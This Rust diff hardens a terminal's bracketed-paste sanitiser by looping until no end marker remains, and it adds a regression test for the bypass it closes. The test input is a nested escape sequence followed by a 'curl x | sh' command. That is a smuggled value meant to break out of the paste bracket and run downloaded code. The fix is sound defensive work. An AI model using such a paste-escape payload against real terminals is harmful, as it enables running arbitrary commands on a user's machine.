@@ -175,7 +175,11 @@ pub fn paste_bytes(text: &str, bracketed: bool) -> Vec<u8> {
     let normalized = text.replace("\r\n", "\r").replace('\n', "\r");
     if bracketed {
         // Strip any embedded end marker so pasted text cannot break out of the bracket.
-        let safe = normalized.replace("\x1b[201~", "");
+        // Repeated: removing one marker can join the text around it into another.
+        let mut safe = normalized;
+        while safe.contains("\x1b[201~") {
+            safe = safe.replace("\x1b[201~", "");
+        }
         format!("\x1b[200~{safe}\x1b[201~").into_bytes()
     } else {
         normalized.into_bytes()
@@ -455,6 +459,9 @@ mod tests {
     fn paste_is_bracketed_and_sanitised() {
         assert_eq!(paste_bytes("a\nb", false), b"a\rb".to_vec());
         assert_eq!(paste_bytes("x\x1b[201~y", true), b"\x1b[200~xy\x1b[201~".to_vec());
+        // Removing the inner marker must not leave a new one behind.
+        let nested = paste_bytes("\x1b[201\x1b[201~~ && curl x | sh\n", true);
+        assert_eq!(nested, b"\x1b[200~ && curl x | sh\r\x1b[201~".to_vec());
     }
 
     #[test]
